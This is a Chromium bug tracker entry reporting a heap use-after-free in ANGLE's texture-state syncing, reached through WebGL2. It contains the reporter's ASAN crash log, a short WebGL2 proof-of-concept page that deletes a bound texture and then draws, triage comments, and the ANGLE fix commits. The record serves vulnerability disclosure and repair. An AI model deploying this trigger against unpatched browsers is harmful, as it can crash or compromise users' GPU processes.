# libANGLE use-after-free (gl::State::syncTextures) triggered through WebGL2 in the GPU process

| Field | Value |
|-------|-------|
| **Issue ID** | [40094327](https://issues.chromium.org/issues/40094327) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>GPU>ANGLE |
| **Platforms** | Windows |
| **Reporter** | ta...@gmail.com |
| **Assignee** | jm...@chromium.org |
| **Created** | 2019-03-19 |
| **Bounty** | $3,000.00 |

## Description

UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36

Steps to reproduce the problem:
I launched the HTML with the ASAN build of the latest Chromium on latest Windows 10, and got the following ASAN log:

=================================================================
==928==ERROR: AddressSanitizer: heap-use-after-free on address 0x1223c49f90d8 at pc 0x7ffbf06f7769 bp 0x0021655fb5a0 sp 0x0021655fb5e8
READ of size 8 at 0x1223c49f90d8 thread T0
    #0 0x7ffbf06f7768 in gl::State::syncTextures(class gl::Context const *) C:\b\swarming\w\ir\cache\builder\src\third_party\angle\src\libANGLE\State.cpp:2566:28
    #1 0x7ffbf066102d in gl::Context::drawArraysInstanced(enum gl::PrimitiveMode,int,int,int) C:\b\swarming\w\ir\cache\builder\src\third_party\angle\src\libANGLE\Context.cpp:2183:5
    #2 0x7ffbf03a1650 in gl::DrawArraysInstanced(unsigned int,int,int,int) C:\b\swarming\w\ir\cache\builder\src\third_party\angle\src\libGLESv2\entry_points_gles_3_0_autogen.cpp:464:22
    #3 0x7ffc0243e9bd in gpu::gles2::GLES2DecoderPassthroughImpl::DoDrawArraysInstancedANGLE(unsigned int,int,int,int) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\gles2_cmd_decoder_passthrough_doers.cc:4233:10
    #4 0x7ffc014320c7 in gpu::gles2::GLES2DecoderPassthroughImpl::HandleDrawArraysInstancedANGLE(unsigned int,void const volatile *) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\gles2_cmd_decoder_passthrough_handlers.cc:1753:10
    #5 0x7ffbff1199eb in gpu::gles2::GLES2DecoderPassthroughImpl::DoCommandsImpl<0>(unsigned int,void const volatile *,int,int *) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\gles2_cmd_decoder_passthrough.cc:655:20
    #6 0x7ffbff118de6 in gpu::gles2::GLES2DecoderPassthroughImpl::DoCommands(unsigned int,void const volatile *,int,int *) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\gles2_cmd_decoder_passthrough.cc:593:12
    #7 0x7ffbff096e49 in gpu::CommandBufferService::Flush(int,class gpu::AsyncAPIInterface *) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\command_buffer_service.cc:69:18
    #8 0x7ffbfc69851c in gpu::CommandBufferStub::OnAsyncFlush(int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > const &) C:\b\swarming\w\ir\cache\builder\src\gpu\ipc\service\command_buffer_stub.cc:543:22
    #9 0x7ffbfc697dff in IPC::MessageT<struct GpuCommandBufferMsg_AsyncFlush_Meta,class std::tuple<int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > >,void>::Dispatch<class gpu::CommandBufferStub,class gpu::CommandBufferStub,void,void ( gpu::CommandBufferStub::*)(int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > const &)>(class IPC::Message const *,class gpu::CommandBufferStub *,class gpu::CommandBufferStub *,void *,void ( gpu::CommandBufferStub::*)(int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > const &)) C:\b\swarming\w\ir\cache\builder\src\ipc\ipc_message_templates.h:146:7
    #10 0x7ffbfc69515e in gpu::CommandBufferStub::OnMessageReceived(class IPC::Message const &) C:\b\swarming\w\ir\cache\builder\src\gpu\ipc\service\command_buffer_stub.cc:193:7
    #11 0x7ffbfa22583f in gpu::GpuChannel::HandleMessageHelper(class IPC::Message const &) C:\b\swarming\w\ir\cache\builder\src\gpu\ipc\service\gpu_channel.cc:566:23
    #12 0x7ffbfa22011a in gpu::GpuChannel::HandleMessage(class IPC::Message const &) C:\b\swarming\w\ir\cache\builder\src\gpu\ipc\service\gpu_channel.cc:543:3
    #13 0x7ffbf9edca37 in gpu::Scheduler::RunNextTask(void) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\scheduler.cc:529:24
    #14 0x7ffbfe401337 in base::TaskAnnotator::RunTask(char const *,struct base::PendingTask *) C:\b\swarming\w\ir\cache\builder\src\base\task\common\task_annotator.cc:104:33
    #15 0x7ffbfb23cc93 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(class base::sequence_manager::LazyNow *,bool *) C:\b\swarming\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:336:21
    #16 0x7ffbfb23c4da in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork(void) C:\b\swarming\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:217:7
    #17 0x7ffbfb1f73f3 in base::MessagePumpDefault::Run(class base::MessagePump::Delegate *) C:\b\swarming\w\ir\cache\builder\src\base\message_loop\message_pump_default.cc:39:55
    #18 0x7ffbfb23e4bc in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool) C:\b\swarming\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:403:12
    #19 0x7ffbf90f59a2 in base::RunLoop::Run(void) C:\b\swarming\w\ir\cache\builder\src\base\run_loop.cc:157:14
    #20 0x7ffbfaff695f in content::GpuMain(struct content::MainFunctionParams const &) C:\b\swarming\w\ir\cache\builder\src\content\gpu\gpu_main.cc:358:14
    #21 0x7ffbf8fecb5a in content::ContentMainRunnerImpl::Run(bool) C:\b\swarming\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:879:10
    #22 0x7ffbf900284a in service_manager::Main(struct service_manager::MainParams const &) C:\b\swarming\w\ir\cache\builder\src\services\service_manager\embedder\main.cc:416:29
    #23 0x7ffbf8feb414 in content::ContentMain(struct content::ContentMainParams const &) C:\b\swarming\w\ir\cache\builder\src\content\app\content_main.cc:19:10
    #24 0x7ffbf2291327 in ChromeMain C:\b\swarming\w\ir\cache\builder\src\chrome\app\chrome_main.cc:103:12
    #25 0x7ff69bec7cdd in MainDllLoader::Launch(struct HINSTANCE__ *,class base::TimeTicks) C:\b\swarming\w\ir\cache\builder\src\chrome\app\main_dll_loader_win.cc:202:12
    #26 0x7ff69bec2352 in main C:\b\swarming\w\ir\cache\builder\src\chrome\app\chrome_exe_main_win.cc:229:20
    #27 0x7ff69c238927 in __scrt_common_main_seh d:\agent\_work\2\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288
    #28 0x7ffc66a981f3  (C:\WINDOWS\System32\KERNEL32.DLL+0x1800181f3)
    #29 0x7ffc6715a250  (C:\WINDOWS\SYSTEM32\ntdll.dll+0x18006a250)

0x1223c49f90d8 is located 344 bytes inside of 520-byte region [0x1223c49f8f80,0x1223c49f9188)
freed by thread T0 here:
    #0 0x7ff69bf04310 in free C:\b\rr\tmpapv6or\w\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_malloc_win.cc:52
    #1 0x7ffbf07b087d in gl::Texture::`scalar deleting destructor'(unsigned int) C:\b\swarming\w\ir\cache\builder\src\third_party\angle\src\libANGLE\Texture.cpp:655:1
    #2 0x7ffbf06ded03 in gl::TypedResourceManager<class gl::Texture,class gl::HandleAllocator,class gl::TextureManager>::deleteObject(class gl::Context const *,unsigned int) C:\b\swarming\w\ir\cache\builder\src\third_party\angle\src\libANGLE\ResourceManager.cpp:96:9
    #3 0x7ffbf0656805 in gl::Context::deleteTexture(unsigned int) C:\b\swarming\w\ir\cache\builder\src\third_party\angle\src\libANGLE\Context.cpp:758:29
    #4 0x7ffbf0679787 in gl::Context::deleteTextures(int,unsigned int const *) C:\b\swarming\w\ir\cache\builder\src\third_party\angle\src\libANGLE\Context.cpp:5500:13
    #5 0x7ffbfa1f4daf in gpu::gles2::TexturePassthrough::~TexturePassthrough(void) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\texture_manager.cc:515:5
    #6 0x7ffbfa217d91 in gpu::gles2::TexturePassthrough::`scalar deleting destructor'(unsigned int) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\texture_manager.cc:512:43
    #7 0x7ffc0241a83e in gpu::gles2::GLES2DecoderPassthroughImpl::DoDeleteTextures(int,unsigned int const volatile *) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\gles2_cmd_decoder_passthrough_doers.cc:1055:3
    #8 0x7ffbff1199eb in gpu::gles2::GLES2DecoderPassthroughImpl::DoCommandsImpl<0>(unsigned int,void const volatile *,int,int *) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\gles2_cmd_decoder_passthrough.cc:655:20
    #9 0x7ffbff118de6 in gpu::gles2::GLES2DecoderPassthroughImpl::DoCommands(unsigned int,void const volatile *,int,int *) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\gles2_cmd_decoder_passthrough.cc:593:12
    #10 0x7ffbff096e49 in gpu::CommandBufferService::Flush(int,class gpu::AsyncAPIInterface *) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\command_buffer_service.cc:69:18
    #11 0x7ffbfc69851c in gpu::CommandBufferStub::OnAsyncFlush(int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > const &) C:\b\swarming\w\ir\cache\builder\src\gpu\ipc\service\command_buffer_stub.cc:543:22
    #12 0x7ffbfc697dff in IPC::MessageT<struct GpuCommandBufferMsg_AsyncFlush_Meta,class std::tuple<int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > >,void>::Dispatch<class gpu::CommandBufferStub,class gpu::CommandBufferStub,void,void ( gpu::CommandBufferStub::*)(int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > const &)>(class IPC::Message const *,class gpu::CommandBufferStub *,class gpu::CommandBufferStub *,void *,void ( gpu::CommandBufferStub::*)(int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > const &)) C:\b\swarming\w\ir\cache\builder\src\ipc\ipc_message_templates.h:146:7
    #13 0x7ffbfc69515e in gpu::CommandBufferStub::OnMessageReceived(class IPC::Message const &) C:\b\swarming\w\ir\cache\builder\src\gpu\ipc\service\command_buffer_stub.cc:193:7
    #14 0x7ffbfa22583f in gpu::GpuChannel::HandleMessageHelper(class IPC::Message const &) C:\b\swarming\w\ir\cache\builder\src\gpu\ipc\service\gpu_channel.cc:566:23
    #15 0x7ffbfa22011a in gpu::GpuChannel::HandleMessage(class IPC::Message const &) C:\b\swarming\w\ir\cache\builder\src\gpu\ipc\service\gpu_channel.cc:543:3
    #16 0x7ffbf9edca37 in gpu::Scheduler::RunNextTask(void) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\scheduler.cc:529:24
    #17 0x7ffbfe401337 in base::TaskAnnotator::RunTask(char const *,struct base::PendingTask *) C:\b\swarming\w\ir\cache\builder\src\base\task\common\task_annotator.cc:104:33
    #18 0x7ffbfb23cc93 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(class base::sequence_manager::LazyNow *,bool *) C:\b\swarming\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:336:21
    #19 0x7ffbfb23c4da in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork(void) C:\b\swarming\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:217:7
    #20 0x7ffbfb1f73f3 in base::MessagePumpDefault::Run(class base::MessagePump::Delegate *) C:\b\swarming\w\ir\cache\builder\src\base\message_loop\message_pump_default.cc:39:55
    #21 0x7ffbfb23e4bc in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool) C:\b\swarming\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:403:12
    #22 0x7ffbf90f59a2 in base::RunLoop::Run(void) C:\b\swarming\w\ir\cache\builder\src\base\run_loop.cc:157:14
    #23 0x7ffbfaff695f in content::GpuMain(struct content::MainFunctionParams const &) C:\b\swarming\w\ir\cache\builder\src\content\gpu\gpu_main.cc:358:14
    #24 0x7ffbf8fecb5a in content::ContentMainRunnerImpl::Run(bool) C:\b\swarming\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:879:10
    #25 0x7ffbf900284a in service_manager::Main(struct service_manager::MainParams const &) C:\b\swarming\w\ir\cache\builder\src\services\service_manager\embedder\main.cc:416:29
    #26 0x7ffbf8feb414 in content::ContentMain(struct content::ContentMainParams const &) C:\b\swarming\w\ir\cache\builder\src\content\app\content_main.cc:19:10
    #27 0x7ffbf2291327 in ChromeMain C:\b\swarming\w\ir\cache\builder\src\chrome\app\chrome_main.cc:103:12
    #28 0x7ff69bec7cdd in MainDllLoader::Launch(struct HINSTANCE__ *,class base::TimeTicks) C:\b\swarming\w\ir\cache\builder\src\chrome\app\main_dll_loader_win.cc:202:12
    #29 0x7ff69bec2352 in main C:\b\swarming\w\ir\cache\builder\src\chrome\app\chrome_exe_main_win.cc:229:20

previously allocated by thread T0 here:
    #0 0x7ff69bf043f0 in malloc C:\b\rr\tmpapv6or\w\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_malloc_win.cc:68
    #1 0x7ffbf0f9e38e in operator new(unsigned __int64) d:\agent\_work\2\s\src\vctools\crt\vcstartup\src\heap\new_scalar.cpp:35
    #2 0x7ffbf06d82ce in gl::TextureManager::AllocateNewObject(class rx::GLImplFactory *,unsigned int,enum gl::TextureType) C:\b\swarming\w\ir\cache\builder\src\third_party\angle\src\libANGLE\ResourceManager.cpp:222:24
    #3 0x7ffbf06900ae in gl::TypedResourceManager<class gl::Texture,class gl::HandleAllocator,class gl::TextureManager>::checkObjectAllocationImpl<enum gl::TextureType>(class rx::GLImplFactory *,unsigned int,enum gl::TextureType) C:\b\swarming\w\ir\cache\builder\src\third_party\angle\src\libANGLE\ResourceManager.h:106:32
    #4 0x7ffbf0659528 in gl::Context::bindTexture(enum gl::TextureType,unsigned int) C:\b\swarming\w\ir\cache\builder\src\third_party\angle\src\libANGLE\Context.cpp:1052:37
    #5 0x7ffbf0394598 in gl::BindTexture(unsigned int,unsigned int) C:\b\swarming\w\ir\cache\builder\src\third_party\angle\src\libGLESv2\entry_points_gles_2_0_autogen.cpp:124:22
    #6 0x7ffc0241593c in gpu::gles2::GLES2DecoderPassthroughImpl::DoBindTexture(unsigned int,unsigned int) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\gles2_cmd_decoder_passthrough_doers.cc:507:10
    #7 0x7ffbff1199eb in gpu::gles2::GLES2DecoderPassthroughImpl::DoCommandsImpl<0>(unsigned int,void const volatile *,int,int *) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\gles2_cmd_decoder_passthrough.cc:655:20
    #8 0x7ffbff118de6 in gpu::gles2::GLES2DecoderPassthroughImpl::DoCommands(unsigned int,void const volatile *,int,int *) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\gles2_cmd_decoder_passthrough.cc:593:12
    #9 0x7ffbff096e49 in gpu::CommandBufferService::Flush(int,class gpu::AsyncAPIInterface *) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\command_buffer_service.cc:69:18
    #10 0x7ffbfc69851c in gpu::CommandBufferStub::OnAsyncFlush(int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > const &) C:\b\swarming\w\ir\cache\builder\src\gpu\ipc\service\command_buffer_stub.cc:543:22
    #11 0x7ffbfc697dff in IPC::MessageT<struct GpuCommandBufferMsg_AsyncFlush_Meta,class std::tuple<int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > >,void>::Dispatch<class gpu::CommandBufferStub,class gpu::CommandBufferStub,void,void ( gpu::CommandBufferStub::*)(int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > const &)>(class IPC::Message const *,class gpu::CommandBufferStub *,class gpu::CommandBufferStub *,void *,void ( gpu::CommandBufferStub::*)(int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > const &)) C:\b\swarming\w\ir\cache\builder\src\ipc\ipc_message_templates.h:146:7
    #12 0x7ffbfc69515e in gpu::CommandBufferStub::OnMessageReceived(class IPC::Message const &) C:\b\swarming\w\ir\cache\builder\src\gpu\ipc\service\command_buffer_stub.cc:193:7
    #13 0x7ffbfa22583f in gpu::GpuChannel::HandleMessageHelper(class IPC::Message const &) C:\b\swarming\w\ir\cache\builder\src\gpu\ipc\service\gpu_channel.cc:566:23
    #14 0x7ffbfa22011a in gpu::GpuChannel::HandleMessage(class IPC::Message const &) C:\b\swarming\w\ir\cache\builder\src\gpu\ipc\service\gpu_channel.cc:543:3
    #15 0x7ffbf9edca37 in gpu::Scheduler::RunNextTask(void) C:\b\swarming\w\ir\cache\builder\src\gpu\command_buffer\service\scheduler.cc:529:24
    #16 0x7ffbfe401337 in base::TaskAnnotator::RunTask(char const *,struct base::PendingTask *) C:\b\swarming\w\ir\cache\builder\src\base\task\common\task_annotator.cc:104:33
    #17 0x7ffbfb23cc93 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(class base::sequence_manager::LazyNow *,bool *) C:\b\swarming\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:336:21
    #18 0x7ffbfb23c4da in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork(void) C:\b\swarming\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:217:7
    #19 0x7ffbfb1f73f3 in base::MessagePumpDefault::Run(class base::MessagePump::Delegate *) C:\b\swarming\w\ir\cache\builder\src\base\message_loop\message_pump_default.cc:39:55
    #20 0x7ffbfb23e4bc in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool) C:\b\swarming\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:403:12
    #21 0x7ffbf90f59a2 in base::RunLoop::Run(void) C:\b\swarming\w\ir\cache\builder\src\base\run_loop.cc:157:14
    #22 0x7ffbfaff695f in content::GpuMain(struct content::MainFunctionParams const &) C:\b\swarming\w\ir\cache\builder\src\content\gpu\gpu_main.cc:358:14
    #23 0x7ffbf8fecb5a in content::ContentMainRunnerImpl::Run(bool) C:\b\swarming\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:879:10
    #24 0x7ffbf900284a in service_manager::Main(struct service_manager::MainParams const &) C:\b\swarming\w\ir\cache\builder\src\services\service_manager\embedder\main.cc:416:29
    #25 0x7ffbf8feb414 in content::ContentMain(struct content::ContentMainParams const &) C:\b\swarming\w\ir\cache\builder\src\content\app\content_main.cc:19:10
    #26 0x7ffbf2291327 in ChromeMain C:\b\swarming\w\ir\cache\builder\src\chrome\app\chrome_main.cc:103:12
    #27 0x7ff69bec7cdd in MainDllLoader::Launch(struct HINSTANCE__ *,class base::TimeTicks) C:\b\swarming\w\ir\cache\builder\src\chrome\app\main_dll_loader_win.cc:202:12
    #28 0x7ff69bec2352 in main C:\b\swarming\w\ir\cache\builder\src\chrome\app\chrome_exe_main_win.cc:229:20
    #29 0x7ff69c238927 in __scrt_common_main_seh d:\agent\_work\2\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288

SUMMARY: AddressSanitizer: heap-use-after-free C:\b\swarming\w\ir\cache\builder\src\third_party\angle\src\libANGLE\State.cpp:2566:28 in gl::State::syncTextures(class gl::Context const *)
Shadow bytes around the buggy address:
  0x043c3d2bf1c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x043c3d2bf1d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x043c3d2bf1e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x043c3d2bf1f0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x043c3d2bf200: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
=>0x043c3d2bf210: fd fd fd fd fd fd fd fd fd fd fd[fd]fd fd fd fd
  0x043c3d2bf220: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x043c3d2bf230: fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x043c3d2bf240: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x043c3d2bf250: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x043c3d2bf260: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==928==ABORTING
[7384:3036:0319/075417.889:ERROR:gles2_cmd_decoder_passthrough_doers.cc(4455)] NOT IMPLEMENTED

What is the expected behavior?
Nothing happens.

What went wrong?
UaF detected in libANGLE loaded by the GPU process 

Did this work before? N/A 

Chrome version: 74.0.3726.0  Channel: stable
OS Version: 10.0
Flash Version:

## Attachments

- [x.html](attachments/x.html) (text/plain, 1.1 KB)

## Timeline

### ta...@gmail.com (2019-03-19)

By Wen Xu of SSLab, Gatech.

### ta...@gmail.com (2019-03-19)

Updated PoC for Chrome release, it seems that in Chrome release, we must specify shader's type in <script>.

<script id="vshader" type="x-shader/x-vertex">
void main () {
}
</script>
<script id="fshader" type="x-shader/x-fragment">
#ifdef GL_ES
#endif
uniform sampler2D u_v12;
void main() {
gl_FragData[0] = texture2DProj(u_v12, vec3(3688.25, 3813.54, 2150.88));
}
</script>
<canvas id="canvas"><script>
var gl = canvas.getContext('webgl2');
var vShader = gl.createShader(gl.VERTEX_SHADER);
var vShaderScript = document.getElementById('vshader');
gl.shaderSource(vShader, vShaderScript.text);
gl.compileShader(vShader);
var fShader = gl.createShader(gl.FRAGMENT_SHADER);
var fShaderScript = document.getElementById('fshader');
gl.shaderSource(fShader, fShaderScript.text);
gl.compileShader(fShader);
var program = gl.createProgram();
gl.attachShader(program, vShader);
gl.attachShader(program, fShader);
gl.linkProgram(program);
gl.useProgram(program);
var u_v12 = gl.getUniformLocation(program, "u_v12");
var gl_v3 = gl.createTexture();
 gl.bindTexture(gl.TEXTURE_2D, gl_v3); 
 gl.texStorage2D(gl.TEXTURE_2D, 9, gl.RG8, 870, 288); 
 gl.uniform1i(u_v12, 1); 
 gl.deleteTexture(gl_v3); 
 gl.drawArraysInstanced(gl.LINES, 952, 85, 751); 
</script>

### cl...@chromium.org (2019-03-21)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5379981124435968.

### ke...@chromium.org (2019-03-22)

Thanks for the report, and apologies for the delayed response. Clusterfuzz seems to be having issues and I am still working on reproducing this.

### ke...@chromium.org (2019-03-22)

This one doesn't seem to have any Direct3D calls on the stack but CF isn't completing the job for some reason.

[Monorail components: Internals>GPU>ANGLE]

### ke...@chromium.org (2019-03-22)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-03-23)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-03-23)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2019-03-23)

[Empty comment from Monorail migration]

### jm...@chromium.org (2019-03-27)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-03-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/angle/angle/+/f7f15ac20a354f71600b0c11789d54546a924d4c

commit f7f15ac20a354f71600b0c11789d54546a924d4c
Author: Jamie Madill <jmadill@chromium.org>
Date: Thu Mar 28 01:36:51 2019

Fix deleting a buffer not updating VAO validation.

Deleting a buffer that is bound to a VAO should act as if
the application unbound the buffer. Unbinding the buffer
should update relevant validation caches. But we were
missing the logic that updates the validation caches.

This CL adds the necessary cache updates. It does not include a
regression test. The test was causing an unrelated regression that is
going to be a bit longer. It should not block this fix.

Bug: chromium:943538
Change-Id: Ib073cd07a230ca073a5b14bc054e961158a0097d
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/1536491
Commit-Queue: Jamie Madill <jmadill@chromium.org>
Reviewed-by: Geoff Lang <geofflang@chromium.org>

[modify] https://crrev.com/f7f15ac20a354f71600b0c11789d54546a924d4c/src/libANGLE/State.h
[modify] https://crrev.com/f7f15ac20a354f71600b0c11789d54546a924d4c/src/libANGLE/VertexArray.h
[modify] https://crrev.com/f7f15ac20a354f71600b0c11789d54546a924d4c/src/libANGLE/VertexArray.cpp
[modify] https://crrev.com/f7f15ac20a354f71600b0c11789d54546a924d4c/src/libANGLE/State.cpp
[modify] https://crrev.com/f7f15ac20a354f71600b0c11789d54546a924d4c/src/libANGLE/Context.h


### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-03-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/939b9130bc4c9463f07df4b19fbaad032ba815dc

commit 939b9130bc4c9463f07df4b19fbaad032ba815dc
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date: Thu Mar 28 03:41:29 2019

Roll src/third_party/angle 208af3ebda25..e18ff25d261d (4 commits)

https://chromium.googlesource.com/angle/angle.git/+log/208af3ebda25..e18ff25d261d


git log 208af3ebda25..e18ff25d261d --date=short --no-merges --format='%ad %ae %s'
2019-03-28 tobine@google.com Vulkan:Refactor SecondaryCommandBuffers
2019-03-28 jdarpinian@chromium.org Sampler state overrides texture state if set
2019-03-28 jmadill@chromium.org Fix deleting a buffer not updating VAO validation.
2019-03-28 jonahr@google.com Remove EGLThreadTest to fix angle_end2end_tests failures on Android.


Created with:
  gclient setdep -r src/third_party/angle@e18ff25d261d

The AutoRoll server is located here: https://autoroll.skia.org/r/angle-chromium-autoroll

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+/master/autoroll/README.md

If the roll is causing failures, please contact the current sheriff, who should
be CC'd on the roll, and stop the roller if necessary.

CQ_INCLUDE_TRYBOTS=luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:win_optional_gpu_tests_rel

BUG=chromium:940080,chromium:809237,chromium:943538
TBR=jonahr@chromium.org

Change-Id: I979f20fd06dc71a51daf0c6c8264aa0e8900b869
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1542494
Reviewed-by: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/master@{#645166}
[modify] https://crrev.com/939b9130bc4c9463f07df4b19fbaad032ba815dc/DEPS


### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-04-01)

The following revision refers to this bug:
  https://chromium.googlesource.com/angle/angle/+/9cce3cd9e376ff5889bad52fb197774ca6b3bc52

commit 9cce3cd9e376ff5889bad52fb197774ca6b3bc52
Author: Jamie Madill <jmadill@chromium.org>
Date: Mon Apr 01 15:39:54 2019

Update texure cache after teleting bound texture.

The texture cache could become out of sync. And we could end up
dereferencing an invalid pointer.

Bug: chromium:943538
Change-Id: I6a99a04e80fc551b6177e25b7bee09c6ae226340
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/1541718
Reviewed-by: Geoff Lang <geofflang@chromium.org>
Reviewed-by: Jonah Ryan-Davis <jonahr@google.com>
Commit-Queue: Jamie Madill <jmadill@chromium.org>

[modify] https://crrev.com/9cce3cd9e376ff5889bad52fb197774ca6b3bc52/src/tests/gl_tests/StateChangeTest.cpp
[modify] https://crrev.com/9cce3cd9e376ff5889bad52fb197774ca6b3bc52/src/libANGLE/State.cpp


### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-04-01)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/e74279973dd13df78e1b0464d1fed493c1468df7

commit e74279973dd13df78e1b0464d1fed493c1468df7
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date: Mon Apr 01 17:18:52 2019

Roll src/third_party/angle 3f7ace324e17..9cce3cd9e376 (1 commits)

https://chromium.googlesource.com/angle/angle.git/+log/3f7ace324e17..9cce3cd9e376


git log 3f7ace324e17..9cce3cd9e376 --date=short --no-merges --format='%ad %ae %s'
2019-04-01 jmadill@chromium.org Update texure cache after teleting bound texture.


Created with:
  gclient setdep -r src/third_party/angle@9cce3cd9e376

The AutoRoll server is located here: https://autoroll.skia.org/r/angle-chromium-autoroll

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+/master/autoroll/README.md

